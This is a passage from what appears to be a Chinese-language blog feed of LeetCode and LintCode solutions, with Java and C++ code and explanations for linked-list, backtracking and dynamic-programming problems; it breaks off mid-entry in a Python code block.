<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Given a sorted linked list, delete all nodes that have duplicate numbers,</span></span><br><span class="line"><span class="comment"> * leaving only distinct numbers from the original list.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * https://leetcode.com/problems/remove-duplicates-from-sorted-list-ii/description/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * 与 Q83RemoveDuplicatesFromSortedList 非常类似，需要注意的有两点：</span></span><br><span class="line"><span class="comment"> * 1. 头部元素重复时，需要直接删除头部元素，所以引入了dummy listnode，这样可以不考虑这种特殊情况</span></span><br><span class="line"><span class="comment"> * 2. 其他元素重复时，需要遍历直到所有元素都删除干净，小心指针的处理</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Q82RemoveDuplicatesFromSortedListII</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ListNode <span class="title">deleteDuplicates</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line"></span><br><span class="line">        ListNode pos = head, prev = dummy;</span><br><span class="line">        <span class="keyword">while</span> ((pos != <span class="keyword">null</span>) &amp;&amp; (pos.next != <span class="keyword">null</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (pos.val == pos.next.val) &#123;</span><br><span class="line">                <span class="keyword">while</span> ((pos.next != <span class="keyword">null</span>) &amp;&amp; (pos.val == pos.next.val)) &#123;</span><br><span class="line">                    pos = pos.next;</span><br><span class="line">                &#125;</span><br><span class="line">                pos = pos.next;</span><br><span class="line">                prev.next =  pos;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                prev = pos;</span><br><span class="line">                pos = pos.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[79. Word Search]]></title>
      <url>/wiki/2017/10/30/Leetcode-79-Word-Search/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a 2D board and a word, find if the word exists in the grid.</p>
<p>The word can be constructed from letters of sequentially adjacent cell, where “adjacent” cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">board =</span><br><span class="line">[</span><br><span class="line">  [&apos;A&apos;,&apos;B&apos;,&apos;C&apos;,&apos;E&apos;],</span><br><span class="line">  [&apos;S&apos;,&apos;F&apos;,&apos;C&apos;,&apos;S&apos;],</span><br><span class="line">  [&apos;A&apos;,&apos;D&apos;,&apos;E&apos;,&apos;E&apos;]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">Given word = &quot;ABCCED&quot;, return true.</span><br><span class="line">Given word = &quot;SEE&quot;, return true.</span><br><span class="line">Given word = &quot;ABCB&quot;, return false.</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>这道题目和迷宫非常相似。Word类似于迷宫的出路。Board类似于迷宫。区别就是没有了迷宫的出发点和出路的数目是固定的。所以一开始就构造一系列出发点，变动word使其达到base case。还有一个区别就是路不能重复走，所以走动以后可以改为’.’，使其不匹配。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">exist_helper</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; board, <span class="keyword">int</span>&amp; nrow, <span class="keyword">int</span>&amp; ncolumn, <span class="built_in">string</span>&amp; word,  <span class="keyword">int</span> row, <span class="keyword">int</span> column)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!word.size())&#123;</span><br><span class="line">            <span class="comment">//base case</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">if</span>(row&lt;<span class="number">0</span>||column&lt;<span class="number">0</span>||column&gt;ncolumn<span class="number">-1</span>||row&gt;nrow<span class="number">-1</span>)&#123;</span><br><span class="line">            <span class="comment">// 出了边界，无效</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (board[row][column]==word[<span class="number">0</span>])&#123;            </span><br><span class="line">            <span class="comment">//choose and explore</span></span><br><span class="line">            word.erase(word.begin());</span><br><span class="line">            <span class="keyword">char</span> s = board[row][column];</span><br><span class="line">            board[row][column]= <span class="string">'.'</span>;</span><br><span class="line">            <span class="keyword">bool</span> result = exist_helper(board, nrow, ncolumn, word, row+<span class="number">1</span>, column)</span><br><span class="line">                    || exist_helper(board, nrow, ncolumn,  word, row<span class="number">-1</span>, column)</span><br><span class="line">                    || exist_helper(board, nrow, ncolumn,  word, row, column+<span class="number">1</span>)</span><br><span class="line">                    || exist_helper(board, nrow, ncolumn, word, row, column<span class="number">-1</span>);</span><br><span class="line">            <span class="comment">//unchoose</span></span><br><span class="line">            <span class="keyword">if</span> (!result)&#123;</span><br><span class="line">                word.insert(word.begin(), s);</span><br><span class="line">                board[row][column] = s;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">exist</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">char</span>&gt;&gt;&amp; board, <span class="built_in">string</span> word)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">int</span> nrow = board.size();</span><br><span class="line">        <span class="keyword">int</span> ncolumn = board[<span class="number">0</span>].size();</span><br><span class="line">        <span class="keyword">bool</span> res = <span class="literal">false</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//构造迷宫出发点</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;nrow; i++)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">0</span>; j&lt;ncolumn; j++)&#123;</span><br><span class="line">                res = res | exist_helper(board, nrow, ncolumn, word, i, j);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[78. Subsets]]></title>
      <url>/wiki/2017/10/30/Leetcode-78-Subsets-md/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a set of <strong>distinct</strong> integers, <code>nums</code>, return all possible subsets (the power set).</p>
<p><strong>Note</strong>: The solution set must not contain duplicate subsets.</p>
<p><strong>Example</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Input: nums = [1,2,3]</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [3],</span><br><span class="line">  [1],</span><br><span class="line">  [2],</span><br><span class="line">  [1,2,3],</span><br><span class="line">  [1,3],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  []</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>幂集(power set)的<a href="https://en.wikipedia.org/wiki/Power_set">wikipedia页面</a></p>
<p>其实和sublists思路一样。以第$i$个元素是否出现在output中为判断条件，构建decision tree。使用backtracking。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">subsetsHelper</span><span class="params">(<span class="keyword">int</span>&amp; n, <span class="keyword">int</span> position, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (position==n)&#123;</span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="comment">//choose and explore</span></span><br><span class="line">            subsetsHelper(n, position+<span class="number">1</span>, nums, chosen, res); <span class="comment">// 不选择</span></span><br><span class="line">            <span class="keyword">int</span> s = nums[position];</span><br><span class="line">            chosen.push_back(s);</span><br><span class="line">            subsetsHelper(n, position+<span class="number">1</span>, nums, chosen, res); <span class="comment">// 选择</span></span><br><span class="line">            <span class="comment">//unchoose</span></span><br><span class="line">            chosen.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; subsets(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums) &#123;</span><br><span class="line">        </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        <span class="keyword">int</span> n = nums.size();</span><br><span class="line">        subsetsHelper(n, <span class="number">0</span>, nums, chosen, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>不过也可以使用传统的backtracking，但是其base case始终发生。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; subsets(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; vec;</span><br><span class="line">        subsets(res, nums, nums.size(), vec, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">subsets</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; &amp;res, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;nums, <span class="keyword">int</span> n, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &amp;vec, <span class="keyword">int</span> begin)</span> </span>&#123;</span><br><span class="line">        res.push_back(vec);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = begin; i &lt; n; ++i) &#123;</span><br><span class="line">            vec.push_back(nums[i]);</span><br><span class="line">            subsets(res, nums, n, vec, i + <span class="number">1</span>);</span><br><span class="line">            vec.pop_back();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
            <tag> Array </tag>
            
            <tag> Bit Manipulation </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[77. Longest Common Subsequence]]></title>
      <url>/wiki/2017/10/30/LintCode-77-Longest-Common-Subsequence/</url>
      <content type="html"><![CDATA[<p>Given two strings, find the longest common subsequence (LCS). Your code should return the length of LCS.</p>
<p>The definition of Longest Common Subsequence [<a href="https://en.wikipedia.org/wiki/Longest_common_subsequence_problem">wiki</a>]:</p>
<blockquote>
<p>the longest subsequence common to all sequences in a set of sequences (often just two sequences). Unlike substrings, subsequences are not required to occupy consecutive positions within the original sequences.</p>
</blockquote>
<p><strong>Example</strong>:</p>
<ul>
<li>For <code>&quot;ABCD&quot;</code> and <code>&quot;EDCA&quot;</code>, the LCS is <code>&quot;A&quot;</code> (or <code>&quot;D&quot;</code>, <code>&quot;C&quot;</code>), return <code>1</code>.</li>
<li>For <code>&quot;ABCD&quot;</code> and <code>&quot;EACB&quot;</code>, the LCS is <code>&quot;AC&quot;</code>, return <code>2</code>.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题可以用动态规划解决。定义$c[i, j]$表示$X_i$和$Y_j$的最长公共子序列的长度，可得如下公式：</p>
<p><img src="http://phpk72ttq.bkt.clouddn.com/LintCode77.png?imageslim" alt="LintCode77"></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(String A, String B)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = A.length(), m = B.length();</span><br><span class="line">    <span class="keyword">int</span> lcs[][] = <span class="keyword">new</span> <span class="keyword">int</span>[n + <span class="number">1</span>][m + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= m; j++)</span><br><span class="line">            <span class="keyword">if</span>(A.charAt(i - <span class="number">1</span>) == B.charAt(j - <span class="number">1</span>))</span><br><span class="line">                lcs[i][j] = lcs[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">else</span> lcs[i][j] = Math.max(lcs[i - <span class="number">1</span>][j], lcs[i][j - <span class="number">1</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> lcs[n][m];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> LintCode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Classic </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[77. Combinations]]></title>
      <url>/wiki/2017/10/30/Leetcode-77-Combinations/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given two integers $n$ and $k$, return all possible combinations of $k$ numbers out of $1 … n$.</p>
<p>Example:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4, k = 2</span><br><span class="line">Output:</span><br><span class="line">[</span><br><span class="line">  [2,4],</span><br><span class="line">  [3,4],</span><br><span class="line">  [2,3],</span><br><span class="line">  [1,2],</span><br><span class="line">  [1,3],</span><br><span class="line">  [1,4],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>非常明显的用backtracking的题目。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combineHelper</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> position, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (chosen.size()==k)&#123;</span><br><span class="line">            <span class="comment">// base case</span></span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i= position; i&lt;n; i++)&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                chosen.push_back(nums[i]);</span><br><span class="line">                <span class="comment">// explore</span></span><br><span class="line">                combineHelper(n, k, i+<span class="number">1</span>, nums, chosen, res);</span><br><span class="line">                <span class="comment">// unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combine(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; nums, chosen;</span><br><span class="line">        <span class="comment">// 初始化num为1...n</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">1</span>; i&lt; n+<span class="number">1</span>; i++)&#123;</span><br><span class="line">            nums.push_back(i);</span><br><span class="line">        &#125;</span><br><span class="line">        combineHelper(n, k, <span class="number">0</span>, nums, chosen, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实都不用nums数组，因为其nums[i]=i+1;</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">combineHelper</span><span class="params">(<span class="keyword">int</span> n, <span class="keyword">int</span> k, <span class="keyword">int</span> position, <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; chosen, <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt;&amp; res)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (chosen.size()==k)&#123;</span><br><span class="line">            <span class="comment">// base case</span></span><br><span class="line">            res.push_back(chosen);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i= position; i&lt;n; i++)&#123;</span><br><span class="line">                <span class="comment">//choose</span></span><br><span class="line">                chosen.push_back(i+<span class="number">1</span>);</span><br><span class="line">                <span class="comment">// explore</span></span><br><span class="line">                combineHelper(n, k, i+<span class="number">1</span>, chosen, res);</span><br><span class="line">                <span class="comment">// unchoose</span></span><br><span class="line">                chosen.pop_back();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; combine(<span class="keyword">int</span> n, <span class="keyword">int</span> k) &#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; res;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; chosen;</span><br><span class="line">        combineHelper(n, k, <span class="number">0</span>, chosen, res);</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Backtracking </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[19. Remove Nth Node From End of List]]></title>
      <url>/wiki/2017/10/30/Leetcode-19-Remove-Nth-Node-From-End-of-List/</url>
      <content type="html"><![CDATA[<h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><p>Given a linked list, remove the $n$th node from the end of list and return its head.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">For example,</span><br><span class="line"></span><br><span class="line">   Given linked list: 1-&gt;2-&gt;3-&gt;4-&gt;5, and n = 2.</span><br><span class="line"></span><br><span class="line">   After removing the second node from the end, the linked list becomes 1-&gt;2-&gt;3-&gt;5.</span><br></pre></td></tr></table></figure>
<h2 id="中文版题目"><a href="#中文版题目" class="headerlink" title="中文版题目"></a>中文版题目</h2><p><strong>Note</strong>:</p>
<p>Given n will always be valid.<br>Try to do this in one pass.</p>
<p>将一个链表中的倒数第n个元素从链表中去除。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">例子：</span><br><span class="line"></span><br><span class="line">输入: list = 1-&gt;2-&gt;3-&gt;4-&gt;5, n = 2. 输出: 1-&gt;2-&gt;3-&gt;5</span><br></pre></td></tr></table></figure>
<p>注意点：</p>
<p>不用考虑n是非法的情况<br>尽量做到只遍历一次链表</p>
<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>首先最简单的方法当然是两次遍历链表，第一次遍历计算链表元素个数，第二次遍历达到目标节点。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"># class 